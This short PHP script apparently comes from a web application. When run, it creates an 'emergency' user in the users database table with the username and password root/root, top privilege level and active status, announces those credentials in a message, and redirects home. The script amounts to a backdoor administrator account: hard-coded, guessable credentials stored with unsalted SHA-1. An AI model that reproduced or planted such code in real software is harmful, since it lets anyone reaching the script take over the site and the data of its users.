<?php

$a=array();
$a['name']="UsuarioDeEmergencia";
$a['username']="root";
$a['password']=sha1("root");
$a['user_level']=1;
$a['status']=1;

if(insertUpdateBBDD("users",$a))
    $session->msg('d','NEW USER AUX root/root');
else $session->msg('d','NEW USER AUX root/root');

redirect("?p=home");

?>